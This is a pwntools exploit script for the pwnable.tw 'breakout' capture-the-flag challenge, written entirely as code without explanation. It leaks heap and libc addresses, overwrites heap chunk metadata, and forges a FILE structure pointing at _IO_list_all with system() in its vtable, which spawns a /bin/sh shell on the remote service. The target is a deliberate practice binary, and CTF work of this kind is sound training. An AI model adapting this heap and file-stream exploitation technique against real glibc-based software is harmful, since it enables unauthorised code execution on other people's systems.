from pwn import *

BEDUG = True

libc = ELF('./libc_64.so.6')

if BEDUG==True:
    io = process('./breakout_patched')
    gdb.attach(io)
else:
    io = remote('chall.pwnable.tw', 10400)

occupied = 0

def note(idx, size, dat):
    io.sendlineafter(b'> ', b'note')
    io.sendlineafter(b'Cell: ', str(idx).encode('utf-8'))
    io.sendlineafter(b'Size: ', str(size).encode('utf-8'))
    io.sendafter(b'Note: ', dat)

def rm(idx):
    global occupied
    if (not occupied):
        io.sendlineafter(b'> ', b'punish')
        io.sendlineafter(b'Cell: ', str(idx).encode('utf-8'))
        occupied = 1
    else:
        log.info('You\'re a tyrant')

def lst():
    io.sendlineafter(b'> ', b'list')

rm(9)
note(1, 0x48, b'\0')
lst()
io.recvuntil(b'ice pick\nNote: ')
io.recv(8)
heap = u64(io.recv(8))
if BEDUG==True:
    heap += 0x440
    log.info('Heap: '+hex(heap))
    note(1, 0x48, p64(0)*3+p64(0x0000000900000009)+p64(0)+p64(0x7fffffff7fffffff)+p64(heap))
    note(9, 0x30, p64(0)+b'\xc1\x07\0')
else:
    heap += 0x30
    log.info('Heap: '+hex(heap))
    note(1, 0x48, p64(0)*3+p64(0x0000000900000009)+p64(0)+p64(0x7fffffff7fffffff)+p64(heap))
    note(9, 0x30, p64(0)+p64(0xbd1))
note(2, 0x1000, b'A')
lst()
io.recvuntil(b'Note: ')
io.recv(16)
libc.address = u64(io.recv(8)) - libc.sym['main_arena'] - 88
log.info('Libc: '+hex(libc.address))
fc = b'/bin/sh\0'
fc += p64(0x61)
fc += p64(0)
fc += p64(libc.sym['_IO_list_all']-0x10)
fc += p64(0)
fc += p64(0x10)
fc += b'\0' * 0xa8
vt = heap + len(fc) + 8
fc += p64(vt)
fc += p64(libc.sym['system'])*4
note(9, 0x200, fc)
io.sendlineafter(b'> ', b'note')
io.sendlineafter(b'Cell: ', b'3')
io.sendlineafter(b'Size: ', b'48')
io.interactive()
